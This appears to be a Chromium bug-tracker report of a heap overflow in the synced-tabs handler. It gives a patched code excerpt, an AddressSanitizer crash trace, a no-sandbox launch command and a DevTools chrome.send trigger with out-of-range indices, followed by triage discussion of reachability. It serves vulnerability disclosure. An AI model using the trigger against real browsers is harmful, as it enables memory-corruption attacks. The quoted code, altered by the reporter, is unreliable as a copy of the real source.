# heap overflow in ForeignSessionHandler::OpenForeignSessionWindows

| Field | Value |
|-------|-------|
| **Issue ID** | [40062710](https://issues.chromium.org/issues/40062710) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | UI>Browser>History |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | wx...@gmail.com |
| **Assignee** | to...@chromium.org |
| **Created** | 2023-01-17 |
| **Bounty** | $3,000.00 |

## Description

**Steps to reproduce the problem:**  

1.  

2.a  

3.

**Problem Description:**  

a

**Additional Comments:**

\*\*Chrome version: \*\* 109.0.0.0 \*\*Channel: \*\* Not sure

**OS:** Chrome OS

## Attachments

- [background.js](attachments/background.js) (text/plain, 661 B)
- [injection.js](attachments/injection.js) (text/plain, 991 B)
- [manifest.json](attachments/manifest.json) (text/plain, 478 B)
- [0001-trigger-overflow.patch](attachments/0001-trigger-overflow.patch) (text/plain, 2.2 KB)
- [poc.png](attachments/poc.png) (image/png, 1.1 MB)

## Timeline

### [Deleted User] (2023-01-17)

[Empty comment from Monorail migration]

### wx...@gmail.com (2023-01-17)

```
void ForeignSessionHandler::OpenForeignSessionWindows(
    content::WebUI* web_ui,
    const std::string& session_string_value,
    int window_num) {
   sync_sessions::OpenTabsUIDelegate* open_tabs = GetOpenTabsUIDelegate(web_ui); 
  if (!open_tabs)
     return;

  // printf("we will start---->>%d\n", window_num);
  std::vector<const ::sessions::SessionWindow*> windows;
  const ::sessions::SessionWindow *window1 = new ::sessions::SessionWindow();
  windows.push_back(window1);
   Note: we don't own the ForeignSessions themselves.
   if (!open_tabs->GetForeignSession(session_string_value, &windows)) {
     LOG(ERROR) << "ForeignSessionHandler failed to get session data from"
                   "OpenTabsUIDelegate.";
     return;
   }
  std::vector<const ::sessions::SessionWindow*>::const_iterator iter_begin =
      windows.begin() + (window_num < 0 ? 0 : window_num);        --------->>>>>  [1]
  auto iter_end =
      window_num < 0
          ? std::vector<const ::sessions::SessionWindow*>::const_iterator(
                windows.end())
          : iter_begin + 1;

  SessionRestore::RestoreForeignSessionWindows(Profile::FromWebUI(web_ui),
                                               iter_begin, iter_end);

  size_t total_tabs_opened = 0;
  for (const ::sessions::SessionWindow* window : windows) {
    UMA_HISTOGRAM_COUNTS_1000(
        "HistoryPage.OtherDevicesMenu.OpenAll.TabsPerWindow",
        window->tabs.size());
    total_tabs_opened += window->tabs.size();
  }
  UMA_HISTOGRAM_COUNTS_1000("HistoryPage.OtherDevicesMenu.OpenAll.TotalTabs",
                            total_tabs_opened);
  UMA_HISTOGRAM_COUNTS_100("HistoryPage.OtherDevicesMenu.OpenAll.TotalWindows",
                           windows.size());
}
```

in this function [1] when window_num > windows.size() it will cause heap overflow.
It seems that the function can be trigger in webui.
so I make a poc

```
 out/asan/Chromium.app/Contents/MacOS/Chromium --no-sandbox --remote-debugging-port=9222  --remote-allow-origins=http://localhost:9222
```


```
=================================================================
==80941==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x00014ffbb6d0 at pc 0x00028c94ed78 bp 0x00016b0047f0 sp 0x00016b0047e8
READ of size 8 at 0x00014ffbb6d0 thread T0
==80941==WARNING: invalid path to external symbolizer!
==80941==WARNING: Failed to use and restart external symbolizer!
    #0 0x28c94ed74 in SessionRestoreImpl::RestoreForeignSession(std::Cr::__wrap_iter<sessions::SessionWindow const* const*>, std::Cr::__wrap_iter<sessions::SessionWindow const* const*>)+0x88c (/Users/raven/work/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/111.0.5543.0/Chromium Framework:arm64+0xc94ed74) (BuildId: 4c4c448655553144a1f49376930e4dd732000000200000000100000000000b00)
    #1 0x28c94e358 in SessionRestore::RestoreForeignSessionWindows(Profile*, std::Cr::__wrap_iter<sessions::SessionWindow const* const*>, std::Cr::__wrap_iter<sessions::SessionWindow const* const*>)+0x13c (/Users/raven/work/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/111.0.5543.0/Chromium Framework:arm64+0xc94e358) (BuildId: 4c4c448655553144a1f49376930e4dd732000000200000000100000000000b00)
    #2 0x29afbbf48 in browser_sync::ForeignSessionHandler::OpenForeignSessionWindows(content::WebUI*, std::Cr::basic_string<char, std::Cr::char_traits<char>, std::Cr::allocator<char> > const&, int)+0x190 (/Users/raven/work/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/111.0.5543.0/Chromium Framework:arm64+0x1afbbf48) (BuildId: 4c4c448655553144a1f49376930e4dd732000000200000000100000000000b00)
    #3 0x29afbd148 in browser_sync::ForeignSessionHandler::HandleOpenForeignSession(base::Value::List const&)+0x378 (/Users/raven/work/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/111.0.5543.0/Chromium Framework:arm64+0x1afbd148) (BuildId: 4c4c448655553144a1f49376930e4dd732000000200000000100000000000b00)
    #4 0x287d79dbc in content::WebUIImpl::ProcessWebUIMessage(GURL const&, std::Cr::basic_string<char, std::Cr::char_traits<char>, std::Cr::allocator<char> > const&, base::Value::List)+0x1bc (/Users/raven/work/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/111.0.5543.0/Chromium Framework:arm64+0x7d79dbc) (BuildId: 4c4c448655553144a1f49376930e4dd732000000200000000100000000000b00)
    #5 0x287d77dac in content::WebUIImpl::Send(std::Cr::basic_string<char, std::Cr::char_traits<char>, std::Cr::allocator<char> > const&, base::Value::List)+0x3d4 (/Users/raven/work/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/111.0.5543.0/Chromium Framework:arm64+0x7d77dac) (BuildId: 4c4c448655553144a1f49376930e4dd732000000200000000100000000000b00)
    #6 0x2839557ec in content::mojom::WebUIHostStubDispatch::Accept(content::mojom::WebUIHost*, mojo::Message*)+0x278 (/Users/raven/work/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/111.0.5543.0/Chromium Framework:arm64+0x39557ec) (BuildId: 4c4c448655553144a1f49376930e4dd732000000200000000100000000000b00)
    #7 0x28cfa4b8c in mojo::InterfaceEndpointClient::HandleValidatedMessage(mojo::Message*)+0x73c (/Users/raven/work/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/111.0.5543.0/Chromium Framework:arm64+0xcfa4b8c) (BuildId: 4c4c448655553144a1f49376930e4dd732000000200000000100000000000b00)
    #8 0x28cfb4e0c in mojo::MessageDispatcher::Accept(mojo::Message*)+0x33c (/Users/raven/work/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/111.0.5543.0/Chromium Framework:arm64+0xcfb4e0c) (BuildId: 4c4c448655553144a1f49376930e4dd732000000200000000100000000000b00)
    #9 0x28cfa8e54 in mojo::InterfaceEndpointClient::HandleIncomingMessage(mojo::Message*)+0x148 (/Users/raven/work/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/111.0.5543.0/Chromium Framework:arm64+0xcfa8e54) (BuildId: 4c4c448655553144a1f49376930e4dd732000000200000000100000000000b00)
    #10 0x28e03b95c in IPC::(anonymous namespace)::ChannelAssociatedGroupController::AcceptOnEndpointThread(mojo::Message)+0x320 (/Users/raven/work/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/111.0.5543.0/Chromium Framework:arm64+0xe03b95c) (BuildId: 4c4c448655553144a1f49376930e4dd732000000200000000100000000000b00)
    #11 0x28e0348b4 in base::internal::Invoker<base::internal::BindState<void (IPC::(anonymous namespace)::ChannelAssociatedGroupController::*)(mojo::Message), scoped_refptr<IPC::(anonymous namespace)::ChannelAssociatedGroupController>, mojo::Message>, void ()>::RunOnce(base::internal::BindStateBase*)+0x140 (/Users/raven/work/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/111.0.5543.0/Chromium Framework:arm64+0xe0348b4) (BuildId: 4c4c448655553144a1f49376930e4dd732000000200000000100000000000b00)
    #12 0x28cb0d3e0 in base::TaskAnnotator::RunTaskImpl(base::PendingTask&)+0x304 (/Users/raven/work/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/111.0.5543.0/Chromium Framework:arm64+0xcb0d3e0) (BuildId: 4c4c448655553144a1f49376930e4dd732000000200000000100000000000b00)
    #13 0x28cb52f3c in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*)+0x720 (/Users/raven/work/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/111.0.5543.0/Chromium Framework:arm64+0xcb52f3c) (BuildId: 4c4c448655553144a1f49376930e4dd732000000200000000100000000000b00)
    #14 0x28cb52334 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork()+0x150 (/Users/raven/work/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/111.0.5543.0/Chromium Framework:arm64+0xcb52334) (BuildId: 4c4c448655553144a1f49376930e4dd732000000200000000100000000000b00)
    #15 0x28cc2aa9c in base::MessagePumpCFRunLoopBase::RunWork()+0x16c (/Users/raven/work/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/111.0.5543.0/Chromium Framework:arm64+0xcc2aa9c) (BuildId: 4c4c448655553144a1f49376930e4dd732000000200000000100000000000b00)
    #16 0x28cc181e8 in base::mac::CallWithEHFrame(void () block_pointer)+0xc (/Users/raven/work/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/111.0.5543.0/Chromium Framework:arm64+0xcc181e8) (BuildId: 4c4c448655553144a1f49376930e4dd732000000200000000100000000000b00)
    #17 0x28cc28bfc in base::MessagePumpCFRunLoopBase::RunWorkSource(void*)+0x13c (/Users/raven/work/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/111.0.5543.0/Chromium Framework:arm64+0xcc28bfc) (BuildId: 4c4c448655553144a1f49376930e4dd732000000200000000100000000000b00)
    #18 0x1a46a0a14 in __CFRUNLOOP_IS_CALLING_OUT_TO_A_SOURCE0_PERFORM_FUNCTION__+0x18 (/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation:arm64+0x81a14) (BuildId: fd16d6d910c0323bb43b9781c4a4d26832000000200000000100000000010d00)
    #19 0x3b360001a46a09a8  (<unknown module>)
    #20 0x4a0d8001a46a0718  (<unknown module>)
    #21 0xfb7b8001a469f31c  (<unknown module>)
    #22 0xf22f0001a469e884  (<unknown module>)
    #23 0xb66c0001add73f9c  (<unknown module>)
    #24 0x902c8001add73de0  (<unknown module>)
    #25 0x35458001add73b28  (<unknown module>)
    #26 0x17c0001a7920420  (<unknown module>)
    #27 0x98190001a791f5b0  (<unknown module>)
    #28 0xad1900028bb4138c  (<unknown module>)
    #29 0x28cc181e8 in base::mac::CallWithEHFrame(void () block_pointer)+0xc (/Users/raven/work/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/111.0.5543.0/Chromium Framework:arm64+0xcc181e8) (BuildId: 4c4c448655553144a1f49376930e4dd732000000200000000100000000000b00)
    #30 0x28bb40f98 in -[BrowserCrApplication nextEventMatchingMask:untilDate:inMode:dequeue:]+0x26c (/Users/raven/work/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/111.0.5543.0/Chromium Framework:arm64+0xbb40f98) (BuildId: 4c4c448655553144a1f49376930e4dd732000000200000000100000000000b00)
    #31 0x1a79139e0 in -[NSApplication run]+0x1cc (/System/Library/Frameworks/AppKit.framework/Versions/C/AppKit:arm64+0x2c9e0) (BuildId: dbbd4dea6c683200a81b79b6a62f466932000000200000000100000000010d00)
    #32 0xeb1a80028cc2c2c0  (<unknown module>)
    #33 0x28cc27a28 in base::MessagePumpCFRunLoopBase::Run(base::MessagePump::Delegate*)+0x270 (/Users/raven/work/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/111.0.5543.0/Chromium Framework:arm64+0xcc27a28) (BuildId: 4c4c448655553144a1f49376930e4dd732000000200000000100000000000b00)
    #34 0x28cb548e0 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, base::TimeDelta)+0x338 (/Users/raven/work/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/111.0.5543.0/Chromium Framework:arm64+0xcb548e0) (BuildId: 4c4c448655553144a1f49376930e4dd732000000200000000100000000000b00)
    #35 0x28caa6b9c in base::RunLoop::Run(base::Location const&)+0x3c0 (/Users/raven/work/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/111.0.5543.0/Chromium Framework:arm64+0xcaa6b9c) (BuildId: 4c4c448655553144a1f49376930e4dd732000000200000000100000000000b00)
    #36 0x2868e5ad0 in content::BrowserMainLoop::RunMainMessageLoop()+0x238 (/Users/raven/work/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/111.0.5543.0/Chromium Framework:arm64+0x68e5ad0) (BuildId: 4c4c448655553144a1f49376930e4dd732000000200000000100000000000b00)
    #37 0x2868ea504 in content::BrowserMainRunnerImpl::Run()+0x30 (/Users/raven/work/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/111.0.5543.0/Chromium Framework:arm64+0x68ea504) (BuildId: 4c4c448655553144a1f49376930e4dd732000000200000000100000000000b00)
    #38 0x2868e07f8 in content::BrowserMain(content::MainFunctionParams)+0x1d8 (/Users/raven/work/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/111.0.5543.0/Chromium Framework:arm64+0x68e07f8) (BuildId: 4c4c448655553144a1f49376930e4dd732000000200000000100000000000b00)
    #39 0x28ba052fc in content::RunBrowserProcessMain(content::MainFunctionParams, content::ContentMainDelegate*)+0x21c (/Users/raven/work/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/111.0.5543.0/Chromium Framework:arm64+0xba052fc) (BuildId: 4c4c448655553144a1f49376930e4dd732000000200000000100000000000b00)
    #40 0x28ba079d4 in content::ContentMainRunnerImpl::RunBrowser(content::MainFunctionParams, bool)+0x3b4 (/Users/raven/work/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/111.0.5543.0/Chromium Framework:arm64+0xba079d4) (BuildId: 4c4c448655553144a1f49376930e4dd732000000200000000100000000000b00)
    #41 0x28ba07350 in content::ContentMainRunnerImpl::Run()+0x574 (/Users/raven/work/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/111.0.5543.0/Chromium Framework:arm64+0xba07350) (BuildId: 4c4c448655553144a1f49376930e4dd732000000200000000100000000000b00)
    #42 0x28ba037cc in content::RunContentProcess(content::ContentMainParams, content::ContentMainRunner*)+0xf64 (/Users/raven/work/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/111.0.5543.0/Chromium Framework:arm64+0xba037cc) (BuildId: 4c4c448655553144a1f49376930e4dd732000000200000000100000000000b00)
    #43 0x28ba03ecc in content::ContentMain(content::ContentMainParams)+0x134 (/Users/raven/work/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/111.0.5543.0/Chromium Framework:arm64+0xba03ecc) (BuildId: 4c4c448655553144a1f49376930e4dd732000000200000000100000000000b00)
    #44 0x2800066dc in ChromeMain+0x218 (/Users/raven/work/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/111.0.5543.0/Chromium Framework:arm64+0x66dc) (BuildId: 4c4c448655553144a1f49376930e4dd732000000200000000100000000000b00)
    #45 0x104df8c54 in main+0x23c (/Users/raven/work/chromium/src/out/asan/Chromium.app/Contents/MacOS/Chromium:arm64+0x100000c54) (BuildId: 4c4c440b55553144a14e4dc1bbe0ee5832000000200000000100000000000b00)
    #46 0x1a4297e4c  (<unknown module>)
    #47 0xa104fffffffffffc  (<unknown module>)

0x00014ffbb6d0 is located 13784 bytes after 8-byte region [0x00014ffb80f0,0x00014ffb80f8)
allocated by thread T12 here:
    #0 0x1051289dc in __asan_memmove+0x1b58 (/Users/raven/work/chromium/src/out/asan/Chromium.app/Contents/MacOS/libclang_rt.asan_osx_dynamic.dylib:arm64+0x4c9dc) (BuildId: 4c4c44a355553144a1fa9666e0966bb332000000200000000100000000000b00)
    #1 0x28bad2588 in operator new(unsigned long)+0x18 (/Users/raven/work/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/111.0.5543.0/Chromium Framework:arm64+0xbad2588) (BuildId: 4c4c448655553144a1f49376930e4dd732000000200000000100000000000b00)
    #2 0x28cfeca2c in mojo::internal::MessageDispatchContext::~MessageDispatchContext()+0x120 (/Users/raven/work/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/111.0.5543.0/Chromium Framework:arm64+0xcfeca2c) (BuildId: 4c4c448655553144a1f49376930e4dd732000000200000000100000000000b00)
    #3 0x28cfb4e34 in mojo::MessageDispatcher::Accept(mojo::Message*)+0x364 (/Users/raven/work/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/111.0.5543.0/Chromium Framework:arm64+0xcfb4e34) (BuildId: 4c4c448655553144a1f49376930e4dd732000000200000000100000000000b00)
    #4 0x28cf98e4c in mojo::Connector::DispatchMessage(mojo::ScopedHandleBase<mojo::MessageHandle>)+0x31c (/Users/raven/work/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/111.0.5543.0/Chromium Framework:arm64+0xcf98e4c) (BuildId: 4c4c448655553144a1f49376930e4dd732000000200000000100000000000b00)
    #5 0x28cf9a778 in mojo::Connector::ReadAllAvailableMessages()+0x2a8 (/Users/raven/work/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/111.0.5543.0/Chromium Framework:arm64+0xcf9a778) (BuildId: 4c4c448655553144a1f49376930e4dd732000000200000000100000000000b00)
    #6 0x28341cc70 in mojo::SimpleWatcher::DiscardReadyState(base::RepeatingCallback<void (unsigned int)> const&, unsigned int, mojo::HandleSignalsState const&)+0x6c (/Users/raven/work/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/111.0.5543.0/Chromium Framework:arm64+0x341cc70) (BuildId: 4c4c448655553144a1f49376930e4dd732000000200000000100000000000b00)
    #7 0x28d0091b0 in mojo::SimpleWatcher::OnHandleReady(int, unsigned int, mojo::HandleSignalsState const&)+0x368 (/Users/raven/work/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/111.0.5543.0/Chromium Framework:arm64+0xd0091b0) (BuildId: 4c4c448655553144a1f49376930e4dd732000000200000000100000000000b00)
    #8 0x28d00a0a8 in base::internal::Invoker<base::internal::BindState<void (mojo::SimpleWatcher::*)(int, unsigned int, mojo::HandleSignalsState const&), base::WeakPtr<mojo::SimpleWatcher>, int, unsigned int, mojo::HandleSignalsState>, void ()>::RunOnce(base::internal::BindStateBase*)+0x188 (/Users/raven/work/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/111.0.5543.0/Chromium Framework:arm64+0xd00a0a8) (BuildId: 4c4c448655553144a1f49376930e4dd732000000200000000100000000000b00)
    #9 0x28cb0d3e0 in base::TaskAnnotator::RunTaskImpl(base::PendingTask&)+0x304 (/Users/raven/work/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/111.0.5543.0/Chromium Framework:arm64+0xcb0d3e0) (BuildId: 4c4c448655553144a1f49376930e4dd732000000200000000100000000000b00)
    #10 0x28cb52f3c in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*)+0x720 (/Users/raven/work/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/111.0.5543.0/Chromium Framework:arm64+0xcb52f3c) (BuildId: 4c4c448655553144a1f49376930e4dd732000000200000000100000000000b00)
    #11 0x28cb52334 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork()+0x150 (/Users/raven/work/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/111.0.5543.0/Chromium Framework:arm64+0xcb52334) (BuildId: 4c4c448655553144a1f49376930e4dd732000000200000000100000000000b00)
    #12 0x28cc61788 in base::MessagePumpKqueue::Run(base::MessagePump::Delegate*)+0x204 (/Users/raven/work/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/111.0.5543.0/Chromium Framework:arm64+0xcc61788) (BuildId: 4c4c448655553144a1f49376930e4dd732000000200000000100000000000b00)
    #13 0x28cb548e0 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, base::TimeDelta)+0x338 (/Users/raven/work/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/111.0.5543.0/Chromium Framework:arm64+0xcb548e0) (BuildId: 4c4c448655553144a1f49376930e4dd732000000200000000100000000000b00)
    #14 0x28caa6b9c in base::RunLoop::Run(base::Location const&)+0x3c0 (/Users/raven/work/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/111.0.5543.0/Chromium Framework:arm64+0xcaa6b9c) (BuildId: 4c4c448655553144a1f49376930e4dd732000000200000000100000000000b00)
    #15 0x28cbb1990 in base::Thread::Run(base::RunLoop*)+0xdc (/Users/raven/work/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/111.0.5543.0/Chromium Framework:arm64+0xcbb1990) (BuildId: 4c4c448655553144a1f49376930e4dd732000000200000000100000000000b00)
    #16 0x2868ecfdc in content::BrowserProcessIOThread::IOThreadRun(base::RunLoop*)+0x118 (/Users/raven/work/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/111.0.5543.0/Chromium Framework:arm64+0x68ecfdc) (BuildId: 4c4c448655553144a1f49376930e4dd732000000200000000100000000000b00)
    #17 0x28cbb1d1c in base::Thread::ThreadMain()+0x304 (/Users/raven/work/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/111.0.5543.0/Chromium Framework:arm64+0xcbb1d1c) (BuildId: 4c4c448655553144a1f49376930e4dd732000000200000000100000000000b00)
    #18 0x28cc11e84 in base::(anonymous namespace)::ThreadFunc(void*)+0xe0 (/Users/raven/work/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/111.0.5543.0/Chromium Framework:arm64+0xcc11e84) (BuildId: 4c4c448655553144a1f49376930e4dd732000000200000000100000000000b00)
    #19 0x1a45c1068 in _pthread_start+0x90 (/usr/lib/system/libsystem_pthread.dylib:arm64+0x7068) (BuildId: 132084c6c34734899ac2fcaad21cdb7332000000200000000100000000010d00)
    #20 0xd9130001a45bbe28  (<unknown module>)

Thread T12 created by T0 here:
    #0 0x105121f20 in __sanitizer_weak_hook_memcmp+0x2dd04 (/Users/raven/work/chromium/src/out/asan/Chromium.app/Contents/MacOS/libclang_rt.asan_osx_dynamic.dylib:arm64+0x45f20) (BuildId: 4c4c44a355553144a1fa9666e0966bb332000000200000000100000000000b00)
    #1 0x28cc11360 in base::(anonymous namespace)::CreateThread(unsigned long, bool, base::PlatformThread::Delegate*, base::PlatformThreadHandle*, base::ThreadType, base::MessagePumpType)+0x1dc (/Users/raven/work/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/111.0.5543.0/Chromium Framework:arm64+0xcc11360) (BuildId: 4c4c448655553144a1f49376930e4dd732000000200000000100000000000b00)
    #2 0x28cbb0d60 in base::Thread::StartWithOptions(base::Thread::Options)+0x430 (/Users/raven/work/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/111.0.5543.0/Chromium Framework:arm64+0xcbb0d60) (BuildId: 4c4c448655553144a1f49376930e4dd732000000200000000100000000000b00)
    #3 0x2878adb60 in content::BrowserTaskExecutor::CreateIOThread()+0x248 (/Users/raven/work/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/111.0.5543.0/Chromium Framework:arm64+0x78adb60) (BuildId: 4c4c448655553144a1f49376930e4dd732000000200000000100000000000b00)
    #4 0x28ba07d3c in content::ContentMainRunnerImpl::RunBrowser(content::MainFunctionParams, bool)+0x71c (/Users/raven/work/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/111.0.5543.0/Chromium Framework:arm64+0xba07d3c) (BuildId: 4c4c448655553144a1f49376930e4dd732000000200000000100000000000b00)
    #5 0x28ba07350 in content::ContentMainRunnerImpl::Run()+0x574 (/Users/raven/work/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/111.0.5543.0/Chromium Framework:arm64+0xba07350) (BuildId: 4c4c448655553144a1f49376930e4dd732000000200000000100000000000b00)
    #6 0x28ba037cc in content::RunContentProcess(content::ContentMainParams, content::ContentMainRunner*)+0xf64 (/Users/raven/work/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/111.0.5543.0/Chromium Framework:arm64+0xba037cc) (BuildId: 4c4c448655553144a1f49376930e4dd732000000200000000100000000000b00)
    #7 0x28ba03ecc in content::ContentMain(content::ContentMainParams)+0x134 (/Users/raven/work/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/111.0.5543.0/Chromium Framework:arm64+0xba03ecc) (BuildId: 4c4c448655553144a1f49376930e4dd732000000200000000100000000000b00)
    #8 0x2800066dc in ChromeMain+0x218 (/Users/raven/work/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/111.0.5543.0/Chromium Framework:arm64+0x66dc) (BuildId: 4c4c448655553144a1f49376930e4dd732000000200000000100000000000b00)
    #9 0x104df8c54 in main+0x23c (/Users/raven/work/chromium/src/out/asan/Chromium.app/Contents/MacOS/Chromium:arm64+0x100000c54) (BuildId: 4c4c440b55553144a14e4dc1bbe0ee5832000000200000000100000000000b00)
    #10 0x1a4297e4c  (<unknown module>)
    #11 0xa104fffffffffffc  (<unknown module>)

SUMMARY: AddressSanitizer: heap-buffer-overflow (/Users/raven/work/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/111.0.5543.0/Chromium Framework:arm64+0xc94ed74) (BuildId: 4c4c448655553144a1f49376930e4dd732000000200000000100000000000b00) in SessionRestoreImpl::RestoreForeignSession(std::Cr::__wrap_iter<sessions::SessionWindow const* const*>, std::Cr::__wrap_iter<sessions::SessionWindow const* const*>)+0x88c
Shadow bytes around the buggy address:
  0x00014ffbb400: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x00014ffbb480: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x00014ffbb500: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x00014ffbb580: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x00014ffbb600: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
=>0x00014ffbb680: fa fa fa fa fa fa fa fa fa fa[fa]fa fa fa fa fa
  0x00014ffbb700: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x00014ffbb780: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x00014ffbb800: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x00014ffbb880: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x00014ffbb900: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb

==80941==ADDITIONAL INFO

==80941==Note: Please include this section with the ASan report.
```




### wx...@gmail.com (2023-01-17)

you can also trigger it in these steps:
```
1. use my patch
2.open chrome://history
3.open devtools and  execute ```chrome.send('openForeignSession',["2000","2000","-3000',4.4,true,true,true,true]);```
```

I think you can also trigger it in chromeos version without my patch.

### al...@google.com (2023-01-17)

It isn't immediately obvious how that PoC demonstrates the issue without introducing it through the patch. Do you have instructions on how to reproduce the issue without the PoC, or justification for why the issue can still be reached without the patch?

### wx...@gmail.com (2023-01-18)

I don't know how to trigger without the patch, but from the code, it may need to enable the  open/proxy tabs. I don't know how to enable it.
```
 // Return the active OpenTabsUIDelegate. If open/proxy tabs is not enabled or
  // not currently syncing, returns nullptr.
  virtual OpenTabsUIDelegate* GetOpenTabsUIDelegate() = 0;
```

I don't think the patch has any influence for the bug, the reason of the bug should be fairly straightforward.



### al...@google.com (2023-01-18)

I agree the function isn't written well and if you are able to call it with arbitrary parameters you could trigger an out-of-bounds memory access, but if there isn't a code path that actually calls it with the wrong parameters this isn't a security bug.

### al...@google.com (2023-01-18)

[Empty comment from Monorail migration]

### wx...@gmail.com (2023-01-19)

I found a way to trigger it without the patch.
you need to login chrome, and have anathor devices.
open "chrome://history/syncedTabs" and your page should be similar as  the content of poc.png. 
